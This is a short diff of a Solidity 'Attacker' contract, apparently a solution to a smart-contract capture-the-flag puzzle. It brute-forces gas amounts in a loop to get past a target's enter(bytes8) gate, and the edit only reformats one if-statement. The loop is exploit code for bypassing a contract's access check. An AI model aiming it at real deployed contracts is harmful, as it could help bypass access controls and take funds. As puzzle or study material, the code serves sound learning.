@@ -11,9 +11,7 @@ contract Attacker {
         for (uint256 i = 0; i < 8191; i++) {
             uint256 gasToSend = 8191 * 3 + i;
             (bool success,) = target.call{gas: gasToSend}(abi.encodeWithSignature("enter(bytes8)", key));
-            if (success) {
-                break;
-            }
+            if (success) break;
         }
     }
 }
